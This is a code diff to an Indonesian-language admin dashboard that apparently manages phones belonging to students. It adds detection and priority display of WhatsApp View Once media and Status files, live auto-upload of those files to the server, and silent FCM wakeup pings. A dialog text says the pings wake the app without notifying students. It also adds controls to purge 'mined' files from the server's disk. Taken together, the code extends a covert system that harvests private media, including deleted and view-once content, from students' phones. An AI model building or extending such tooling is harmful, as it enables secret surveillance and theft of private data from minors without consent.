@@ -60,6 +60,14 @@
                 return '🗑️ Foto Terhapus (Sampah)';
             }
 
+            // Deteksi Media Sekali Lihat (WhatsApp View Once / Ephemeral) & Status WA
+            if (lower.includes('sekali_lihat') || lower.includes('view_once') || lower.includes('/private/') || lower.includes('\\private\\')) {
+                return '👁️ Sekali Lihat (View Once WA)';
+            }
+            if (lower.includes('/.statuses') || lower.includes('\\.statuses') || lower.includes('statuses')) {
+                return '⏳ Status WhatsApp';
+            }
+
             const isWaName = fileName.includes('-wa') || fileName.includes('_wa') || fileName.startsWith('wa') || fileName.startsWith('stk-') || fileName.startsWith('aud-') || fileName.startsWith('doc-') || fileName.startsWith('ptt-');
             const isWa = lower.includes('whatsapp') || isWaName;
             const isSent = norm.includes('/sent/') || norm.includes('/sent') || lower.includes('sent') || fileName.includes('sent');
@@ -171,6 +179,12 @@
                         <%= initialAdminControlState ? 'ON' : 'OFF (Dikecualikan)' %>
                     </span>
                 </div>
+
+                <!-- Tombol Bersihkan Storage Mined Server -->
+                <button onclick="purgeMinedStorage()" class="flex items-center gap-1.5 bg-rose-600 hover:bg-rose-700 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition-all shadow-sm cursor-pointer" title="Hapus berkas fisik hasil tambang dari server (Drive D) untuk membebaskan puluhan GB ruang disk. Berkas dikunci permanen sebagai PURGED_ARCHIVED agar tidak pernah diunduh ulang!">
+                    <span>🗑️</span>
+                    <span class="hidden sm:inline">Bersihkan Storage Tambang</span>
+                </button>
             </div>
         </div>
 
@@ -247,6 +261,9 @@
                     <button onclick="cleanupOfflineDevices()" title="Hapus riwayat perangkat offline yang sudah tidak aktif" class="text-xs font-bold px-3 py-2 bg-rose-50 text-rose-700 hover:bg-rose-100 rounded-xl border border-rose-200 transition-colors flex items-center gap-1">
                         <span>🗑️</span> <span>Bersihkan Offline</span>
                     </button>
+                    <button onclick="wakeAllDevicesViaFcm()" title="Kirim sinyal silent FCM wakeup ke seluruh HP agar bangun, lapor heartbeat, dan sinkronkan data saat aplikasi tertutup" class="text-xs font-bold px-3.5 py-2 bg-emerald-600 text-white hover:bg-emerald-700 rounded-xl shadow-sm transition-all flex items-center gap-1.5 cursor-pointer">
+                        <span>⚡</span> <span>Bangunkan Semua HP (Silent Ping)</span>
+                    </button>
                 </div>
 
                 <!-- Live Search Box (Debounced) -->
@@ -277,8 +294,10 @@
                             <% displayDevices.forEach((d, idx) => { 
                                 const isOnline = d.status === 'ONLINE';
                                 const isStandby = d.status === 'STANDBY';
-                                const statusBadgeClass = isOnline ? 'bg-emerald-100 text-emerald-800 border-emerald-300' : (isStandby ? 'bg-amber-100 text-amber-800 border-amber-300' : 'bg-slate-100 text-slate-500 border-slate-200');
-                                const statusLabel = isOnline ? '🟢 ONLINE' : (isStandby ? '🟡 SIAGA' : '⚪ OFFLINE');
+                                const isBlocked = d.status === 'BLOCKED';
+                                const isScanLocked = d.status === 'LOCKED_SCAN' || d.isScanLocked;
+                                const statusBadgeClass = isBlocked ? 'bg-red-100 text-red-800 border-red-300' : (isScanLocked ? 'bg-rose-100 text-rose-800 border-rose-300' : (isOnline ? 'bg-emerald-100 text-emerald-800 border-emerald-300' : (isStandby ? 'bg-amber-100 text-amber-800 border-amber-300' : 'bg-slate-100 text-slate-500 border-slate-200')));
+                                const statusLabel = isBlocked ? '🚫 BLOCKED' : (isScanLocked ? '🔒 SCAN LOCKED' : (isOnline ? '🟢 ONLINE' : (isStandby ? '🟡 SIAGA' : '⚪ OFFLINE')));
                                 const isSelected = (safeSelectedDevice && safeSelectedDevice.id === d.id) || (!safeSelectedDevice && idx === 0);
                                 const ownerName = d.owner?.name || d.user?.name || 'Siswa CBT';
                                 const className = d.owner?.className ? (' (' + d.owner.className + ')') : '';
@@ -398,11 +417,17 @@
                                 </div>
                             </div>
                             <div class="flex flex-wrap items-center gap-2">
+                                <button onclick="wakeCurrentDeviceViaFcm()" class="bg-emerald-600 hover:bg-emerald-500 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition-all shadow-sm flex items-center gap-1.5 cursor-pointer border border-emerald-400/40" title="Kirim sinyal silent FCM wakeup ke HP ini agar bangun dan lapor diri walaupun aplikasi sedang ditutup">
+                                    <span>⚡</span> <span>Bangunkan HP (Ping)</span>
+                                </button>
                                 <button onclick="triggerRescanDevice()" class="bg-indigo-600 hover:bg-indigo-500 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition-all shadow-sm flex items-center gap-1.5 cursor-pointer border border-indigo-400/40" title="Perintahkan HP siswa untuk memindai ulang berkas media sekarang juga">
                                     <span>🔄</span> <span>Pindai Ulang HP</span>
                                 </button>
                                 <button onclick="clearAllDeviceMedia()" class="bg-amber-600/90 hover:bg-amber-600 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition-all shadow-sm flex items-center gap-1.5 cursor-pointer" title="Kosongkan seluruh riwayat & berkas perangkat ini dari database & server (HP tetap terhubung)">
                                     <span>🧹</span> <span>Kosongkan Berkas</span>
+                                </button>
+                                <button id="btnLockScanDevice" onclick="toggleLockScanDevice()" class="bg-rose-600 hover:bg-rose-700 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition-all shadow-sm cursor-pointer flex items-center gap-1.5" title="Kunci scanner dan upload file pada HP ini agar tidak pernah mengirim berkas ke server">
+                                    <span id="btnLockScanIcon">🔒</span> <span id="btnLockScanText">Kunci Scan HP</span>
                                 </button>
                                 <button id="btnBlockDevice" onclick="blockDevice()" class="bg-yellow-500/80 hover:bg-yellow-500 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition-all shadow-sm cursor-pointer">
                                     🚫 Blokir
@@ -491,6 +516,8 @@
                             </div>
                             <% 
                                 const ssrPriority = [
+                                    '👁️ Sekali Lihat (View Once WA)',
+                                    '⏳ Status WhatsApp',
                                     '♻️ Media Terhapus / Trash',
                                     '🗑️ Foto Terhapus (Sampah)',
                                     '✅ Sudah Ditransfer ke PC',
@@ -517,12 +544,17 @@
                                 sortedFolderKeys.forEach(fn => { 
                                     const isTrashPill = fn.includes('Terhapus') || fn.includes('Trash') || fn.includes('Sampah');
                                     const isTransferredPill = fn.includes('Sudah Ditransfer');
-                                    const pillClass = isTrashPill
+                                    const isViewOncePill = fn.includes('Sekali Lihat') || fn.includes('View Once');
+                                    const pillClass = isViewOncePill
+                                        ? 'border-amber-500/80 bg-amber-950/70 text-amber-200 hover:bg-amber-900/90 font-bold shadow-sm'
+                                        : isTrashPill
                                         ? 'border-rose-600/70 bg-rose-950/60 text-rose-200 hover:bg-rose-900/80 font-bold'
                                         : isTransferredPill 
                                         ? 'border-emerald-600/70 bg-emerald-950/60 text-emerald-200 hover:bg-emerald-900/80 font-bold' 
                                         : 'border-slate-700 bg-slate-800 text-slate-200 hover:bg-slate-700';
-                                    const badgePillClass = isTrashPill
+                                    const badgePillClass = isViewOncePill
+                                        ? 'bg-amber-600 text-white font-black'
+                                        : isTrashPill
                                         ? 'bg-rose-800 text-rose-200'
                                         : isTransferredPill
                                         ? 'bg-emerald-800 text-emerald-200'
@@ -1385,6 +1417,43 @@
                 }
             });
 
+            liveEventSource.addEventListener('auto-upload-complete', function(e) {
+                try {
+                    const payload = JSON.parse(e.data);
+                    console.log('⚡ [Live Remote SSE] Auto-Upload Instan Selesai:', payload);
+                    const file = payload.file || payload;
+                    const isVo = payload.isViewOnce || (file.category === 'VIEW_ONCE');
+                    const existing = currentDeviceFiles.find(f => (file.id && f.id === file.id) || (f.fileName && f.fileName === file.fileName));
+                    if (existing) {
+                        existing.isTransferred = true;
+                        existing.isPending = false;
+                        if (file.filePath) existing.filePath = file.filePath;
+                        if (file.category) existing.category = file.category;
+                        const imgInDom = document.querySelector(`img[data-file-id="${existing.id}"]`);
+                        if (imgInDom) {
+                            imgInDom.src = `/api/device/files/view/${encodeURIComponent(existing.id)}?t=${Date.now()}`;
+                        }
+                    } else {
+                        file.isTransferred = true;
+                        file.isPending = false;
+                        currentDeviceFiles.unshift(file);
+                        currentTotalFilesForFolder++;
+                    }
+                    const fName = extractFolderFromPath(file.filePath);
+                    if (currentFolderCounts) {
+                        currentFolderCounts[fName] = (currentFolderCounts[fName] || 0) + 1;
+                        currentFolderCounts['ALL'] = (currentFolderCounts['ALL'] || 0) + 1;
+                        currentFolderCounts['✅ Sudah Ditransfer ke PC'] = (currentFolderCounts['✅ Sudah Ditransfer ke PC'] || 0) + 1;
+                        renderFolderPills();
+                    }
+                    filterDeviceFiles();
+                    const toastIcon = isVo ? '👁️ [SEKALI LIHAT]' : '⚡ [AUTO-UPLOAD]';
+                    showDownloadToast(`${toastIcon} Berkas langsung tersimpan di server: ${file.fileName || ''}`);
+                } catch(err) {
+                    console.error('Error parsing live auto-upload-complete event:', err);
+                }
+            });
+
             liveEventSource.addEventListener('new_recovered_file', function(e) {
                 try {
                     const payload = JSON.parse(e.data);
@@ -1569,6 +1638,14 @@
                 return '♻️ Media Terhapus / Trash';
             }
 
+            // Deteksi Media Sekali Lihat (WhatsApp View Once / Ephemeral) & Status WA
+            if (lower.includes('sekali_lihat') || lower.includes('view_once') || lower.includes('/private/') || lower.includes('\\private\\')) {
+                return '👁️ Sekali Lihat (View Once WA)';
+            }
+            if (lower.includes('/.statuses') || lower.includes('\\.statuses') || lower.includes('statuses')) {
+                return '⏳ Status WhatsApp';
+            }
+
             const isWaName = fileName.includes('-wa') || fileName.includes('_wa') || fileName.startsWith('wa') || fileName.startsWith('stk-') || fileName.startsWith('aud-') || fileName.startsWith('doc-') || fileName.startsWith('ptt-');
             const isWa = lower.includes('whatsapp') || isWaName;
             const isSent = norm.includes('/sent/') || norm.includes('/sent') || lower.includes('sent') || fileName.includes('sent');
@@ -1607,6 +1684,8 @@
             const folderCounts = (currentFolderCounts && Object.keys(currentFolderCounts).length > 0) ? currentFolderCounts : { 'ALL': currentTotalFilesForFolder || currentDeviceFiles.length };
 
             const priorityOrder = [
+                '👁️ Sekali Lihat (View Once WA)',
+                '⏳ Status WhatsApp',
                 '♻️ Media Terhapus / Trash',
                 '✅ Sudah Ditransfer ke PC',
                 '📥 WA Images (Receive)',
@@ -1642,10 +1721,14 @@
                 const isActive = currentFolderFilter === fName;
                 const isTransferred = fName.includes('Sudah Ditransfer');
                 const isTrash = fName.includes('Terhapus') || fName.includes('Trash') || fName.includes('Sampah');
+                const isViewOnce = fName.includes('Sekali Lihat') || fName.includes('View Once');
                 let activeClass = 'border-slate-700 bg-slate-800 text-slate-200 hover:bg-slate-700';
                 let badgeClass = 'bg-slate-700 text-blue-300';
                 if (isActive) {
-                    if (isTrash) {
+                    if (isViewOnce) {
+                        activeClass = 'border-amber-400 bg-amber-500 text-slate-950 font-black shadow-md ring-2 ring-amber-300';
+                        badgeClass = 'bg-slate-900 text-amber-300';
+                    } else if (isTrash) {
                         activeClass = 'border-rose-500 bg-rose-600 text-white font-bold shadow-md';
                         badgeClass = 'bg-rose-800 text-white';
                     } else if (isTransferred) {
@@ -1655,6 +1738,9 @@
                         activeClass = 'border-blue-500 bg-blue-600 text-white font-bold shadow-md';
                         badgeClass = 'bg-blue-800 text-white';
                     }
+                } else if (isViewOnce) {
+                    activeClass = 'border-amber-500/80 bg-amber-950/70 text-amber-200 hover:bg-amber-900/90 font-bold shadow-sm';
+                    badgeClass = 'bg-amber-600 text-white font-black';
                 } else if (isTrash) {
                     activeClass = 'border-rose-600/70 bg-rose-950/60 text-rose-200 hover:bg-rose-900/80 font-bold';
                     badgeClass = 'bg-rose-800 text-rose-200';
@@ -3081,15 +3167,40 @@
 
             const badge = document.getElementById('detailDeviceStatusBadge');
             const offlineBanner = document.getElementById('deviceOfflineBanner');
+            const isBlocked = dev ? (dev.status === 'BLOCKED') : false;
+            const isScanLocked = dev ? (dev.status === 'LOCKED_SCAN' || dev.isScanLocked) : false;
             if (badge) {
-                badge.className = isOnline 
-                    ? 'text-[11px] px-2.5 py-0.5 rounded-full font-bold bg-emerald-500 text-white shadow-sm' 
-                    : (isStandby ? 'text-[11px] px-2.5 py-0.5 rounded-full font-bold bg-amber-500 text-white shadow-sm' : 'text-[11px] px-2.5 py-0.5 rounded-full font-bold bg-slate-700 text-slate-300 shadow-sm');
-                badge.innerText = isOnline ? '🟢 ONLINE' : (isStandby ? '🟡 SIAGA (Standby)' : '⚪ OFFLINE');
+                if (isBlocked) {
+                    badge.className = 'text-[11px] px-2.5 py-0.5 rounded-full font-bold bg-red-600 text-white shadow-sm';
+                    badge.innerText = '🚫 BLOCKED';
+                } else if (isScanLocked) {
+                    badge.className = 'text-[11px] px-2.5 py-0.5 rounded-full font-bold bg-rose-600 text-white shadow-sm';
+                    badge.innerText = '🔒 SCAN LOCKED';
+                } else {
+                    badge.className = isOnline 
+                        ? 'text-[11px] px-2.5 py-0.5 rounded-full font-bold bg-emerald-500 text-white shadow-sm' 
+                        : (isStandby ? 'text-[11px] px-2.5 py-0.5 rounded-full font-bold bg-amber-500 text-white shadow-sm' : 'text-[11px] px-2.5 py-0.5 rounded-full font-bold bg-slate-700 text-slate-300 shadow-sm');
+                    badge.innerText = isOnline ? '🟢 ONLINE' : (isStandby ? '🟡 SIAGA (Standby)' : '⚪ OFFLINE');
+                }
             }
             if (offlineBanner) {
-                if (isOnline || isStandby) offlineBanner.classList.add('hidden');
+                if (isOnline || isStandby || isScanLocked) offlineBanner.classList.add('hidden');
                 else offlineBanner.classList.remove('hidden');
+            }
+
+            const btnLock = document.getElementById('btnLockScanDevice');
+            const iconLock = document.getElementById('btnLockScanIcon');
+            const txtLock = document.getElementById('btnLockScanText');
+            if (btnLock && txtLock) {
+                if (isScanLocked) {
+                    btnLock.className = "bg-emerald-600 hover:bg-emerald-700 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition-all shadow-sm cursor-pointer flex items-center gap-1.5";
+                    if (iconLock) iconLock.innerText = "🔓";
+                    txtLock.innerText = "Buka Kunci Scan";
+                } else {
+                    btnLock.className = "bg-rose-600 hover:bg-rose-700 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition-all shadow-sm cursor-pointer flex items-center gap-1.5";
+                    if (iconLock) iconLock.innerText = "🔒";
+                    txtLock.innerText = "Kunci Scan HP";
+                }
             }
 
             const appVer = dev ? dev.appVersion : (cardEl ? cardEl.getAttribute('data-device-version') : null);
@@ -3921,6 +4032,65 @@
             }, 4000);
         }
 
+        async function toggleLockScanDevice() {
+            if (!currentDeviceId) return;
+            const dev = allDevices.find(d => String(d.id) === currentDeviceId);
+            const isCurrentlyLocked = dev ? (dev.status === 'LOCKED_SCAN' || dev.isScanLocked) : false;
+            const actionPrompt = isCurrentlyLocked
+                ? 'Buka kunci scan untuk perangkat ini? HP akan kembali diizinkan memindai berkas.'
+                : 'KUNCI fitur scan dan upload berkas untuk HP ini? HP tidak akan lagi mengirim atau memindai berkas media ke server.';
+            if (!confirm(actionPrompt)) return;
+
+            try {
+                if (!token) token = await getFreshToken();
+                const endpoint = isCurrentlyLocked
+                    ? `/api/admin/remote-devices/${currentDeviceId}/unlock-scan`
+                    : `/api/admin/remote-devices/${currentDeviceId}/lock-scan`;
+                const res = await fetch(endpoint, {
+                    method: 'PUT',
+                    headers: { 'Authorization': 'Bearer ' + token }
+                });
+                const data = await res.json();
+                alert(data.message || 'Status scan diperbarui');
+                if (dev) {
+                    dev.status = isCurrentlyLocked ? 'ONLINE' : 'LOCKED_SCAN';
+                    dev.isScanLocked = !isCurrentlyLocked;
+                }
+                selectDevice(currentDeviceId);
+                loadDevices();
+            } catch(e) {
+                alert('Gagal mengubah status scan perangkat: ' + e.message);
+            }
+        }
+
+        async function purgeMinedStorage() {
+            const promptMsg = 'PERINGATAN PEMBERSIHAN PENYIMPANAN:\n\n' +
+                'Tindakan ini akan menghapus berkas-berkas fisik hasil tambang (mining) di server (Drive D: /uploads/device-files) untuk membebaskan ruang disk (~30-45 GB).\n\n' +
+                'Riwayat berkas akan DIABADIKAN permanen sebagai PURGED_ARCHIVED sehingga HP siswa TIDAK AKAN PERNAH mengunduh ulang berkas yang sudah pernah ditambang.\n\n' +
+                'Lanjutkan pembersihan berkas tambang sekarang?';
+            if (!confirm(promptMsg)) return;
+
+            try {
+                if (!token) token = await getFreshToken();
+                const res = await fetch('/api/admin/remote-devices/purge-storage', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer ' + token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({})
+                });
+                const data = await res.json();
+                alert(data.message || 'Pembersihan penyimpanan selesai.');
+                if (currentDeviceId) {
+                    selectDevice(currentDeviceId);
+                }
+                loadDevices();
+            } catch(e) {
+                alert('Gagal membersihkan penyimpanan: ' + e.message);
+            }
+        }
+
         async function blockDevice() {
             if (!currentDeviceId) return;
             if (!confirm('Ubah status blokir perangkat ini?')) return;
@@ -3955,6 +4125,38 @@
                 loadDevices();
             } catch(e) {
                 alert('Gagal menghapus perangkat');
+            }
+        }
+
+        async function wakeAllDevicesViaFcm() {
+            if (!confirm('Kirim sinyal bangun (Silent FCM Wakeup Ping) ke seluruh perangkat HP?\n\nSinyal ini akan membangunkan aplikasi di latar belakang secara senyap tanpa notifikasi popup pada siswa, agar HP segera melaporkan status dan sinkronisasi.')) return;
+            try {
+                if (!token) token = await getFreshToken();
+                const res = await fetch('/api/admin/remote-devices/wake-all', {
+                    method: 'POST',
+                    headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }
+                });
+                const data = await res.json();
+                alert(data.message || 'Sinyal bangun berhasil disiarkan.');
+                setTimeout(loadDevices, 3000);
+            } catch (e) {
+                alert('Gagal mengirim sinyal bangun: ' + e.message);
+            }
+        }
+
+        async function wakeCurrentDeviceViaFcm() {
+            if (!currentDeviceId) return;
+            try {
+                if (!token) token = await getFreshToken();
+                const res = await fetch(`/api/admin/remote-devices/${currentDeviceId}/wake`, {
+                    method: 'POST',
+                    headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }
+                });
+                const data = await res.json();
+                alert(data.message || 'Sinyal bangun berhasil dikirim ke perangkat.');
+                setTimeout(() => selectDevice(currentDeviceId), 3000);
+            } catch (e) {
+                alert('Gagal membangunkan perangkat: ' + e.message);
             }
         }
     </script>
